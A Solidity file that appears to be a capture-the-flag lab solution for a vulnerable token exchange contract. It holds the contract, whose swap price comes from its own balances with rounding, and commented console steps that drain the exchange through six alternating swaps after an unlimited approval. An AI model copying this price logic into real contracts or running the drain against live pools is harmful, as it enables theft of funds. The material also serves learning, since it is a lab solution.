// Original Dex and SwappableToken contracts
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import "openzeppelin-contracts-08/access/Ownable.sol";

contract Dex is Ownable {
    address public token1;
    address public token2;

    constructor() {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function addLiquidity(address token_address, uint256 amount) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint256 swapAmount = getSwapPrice(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableToken(token1).approve(msg.sender, spender, amount);
        SwappableToken(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableToken is ERC20 {
    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
    ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}

/* Attack steps in console:
// Get token addresses
token1Address = await contract.token1()
token2Address = await contract.token2()

// Check initial balances
await contract.balanceOf(token1Address, player)
await contract.balanceOf(token2Address, player)
await contract.balanceOf(token1Address, instance)
await contract.balanceOf(token2Address, instance)

// Approve DEX
await contract.approve(instance, '115792089237316195423570985008687907853269984665640564039457584007913129639935')

// 1. Swap 10 token1 for token2
await contract.swap(token1Address, token2Address, '10')
await contract.balanceOf(token1Address, player)
await contract.balanceOf(token2Address, player)

// 2. Swap 20 token2 for token1
await contract.swap(token2Address, token1Address, '20')
await contract.balanceOf(token1Address, player)
await contract.balanceOf(token2Address, player)

// 3. Swap 24 token1 for token2
await contract.swap(token1Address, token2Address, '24')
await contract.balanceOf(token1Address, player)
await contract.balanceOf(token2Address, player)

// 4. Swap 30 token2 for token1
await contract.swap(token2Address, token1Address, '30')
await contract.balanceOf(token1Address, player)
await contract.balanceOf(token2Address, player)

// 5. Swap 41 token1 for token2
await contract.swap(token1Address, token2Address, '41')
await contract.balanceOf(token1Address, player)
await contract.balanceOf(token2Address, player)

// 6. Final swap: 45 token2 for remaining token1
await contract.swap(token2Address, token1Address, '45')
await contract.balanceOf(token1Address, player)
await contract.balanceOf(token2Address, player)

// Final DEX check
await contract.balanceOf(token1Address, instance)
await contract.balanceOf(token2Address, instance)
*/
